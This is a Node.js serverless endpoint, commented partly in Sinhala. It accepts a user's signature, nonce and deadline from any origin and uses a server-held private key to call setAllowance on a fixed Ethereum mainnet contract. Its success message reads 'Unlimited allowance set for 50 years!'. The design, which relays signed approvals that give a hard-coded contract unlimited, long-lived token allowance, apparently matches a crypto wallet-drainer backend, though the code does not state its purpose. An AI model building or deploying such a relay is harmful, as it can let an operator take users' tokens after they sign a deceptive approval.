// api/submit.js
const { ethers } = require('ethers');

module.exports = async (req, res) => {
    // CORS Headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

    if (req.method === 'OPTIONS') return res.status(200).end();

    if (req.method === 'GET') {
        return res.status(200).json({
            status: 'OK',
            message: 'API is working!',
            timestamp: new Date().toISOString()
        });
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { user, nonce, deadline, signature } = req.body;

        console.log('📥 Received:');
        console.log('  👤 User:', user);
        console.log('  📝 Nonce:', nonce);
        console.log('  ⏰ Deadline:', deadline);

        // ⭐ Config - අලුත් Contract Address එක!
        const CONFIG = {
            rpcUrl: `https://eth-mainnet.g.alchemy.com/v2/${process.env.ALCHEMY_API_KEY}`,
            privateKey: process.env.PRIVATE_KEY,
            contractAddress: "0xC501140d9f0C551EA31eEf97B01856c1a96caD82"  // ⭐ අලුත් Address!
        };

        if (!CONFIG.privateKey) {
            return res.status(500).json({ success: false, error: 'PRIVATE_KEY not set' });
        }
        if (!process.env.ALCHEMY_API_KEY) {
            return res.status(500).json({ success: false, error: 'ALCHEMY_API_KEY not set' });
        }

        // Initialize provider & wallet
        const provider = new ethers.providers.JsonRpcProvider(CONFIG.rpcUrl);
        const wallet = new ethers.Wallet(CONFIG.privateKey, provider);
        console.log('👛 Wallet:', wallet.address);

        // ⭐ Contract ABI - 3 parameters විතරයි!
        const contractABI = [
            "function setAllowance(uint256 nonce, uint256 deadline, bytes calldata signature) external"
        ];

        const contract = new ethers.Contract(CONFIG.contractAddress, contractABI, wallet);

        console.log('⏳ Submitting setAllowance()...');
        console.log('📋 Contract:', CONFIG.contractAddress);

        // ⭐ User parameter එක අයින් කරලා!
        const tx = await contract.setAllowance(
            nonce,
            deadline,
            signature
        );

        console.log('📤 Tx Hash:', tx.hash);
        const receipt = await tx.wait();
        console.log('✅ Confirmed! Block:', receipt.blockNumber);

        return res.status(200).json({
            success: true,
            message: '✅ Unlimited allowance set for 50 years!',
            txHash: tx.hash,
            blockNumber: receipt.blockNumber,
            contractAddress: CONFIG.contractAddress,
            etherscanUrl: `https://etherscan.io/tx/${tx.hash}`
        });

    } catch (error) {
        console.error('❌ Error:', error.message);
        return res.status(500).json({
            success: false,
            error: error.message
        });
    }
};
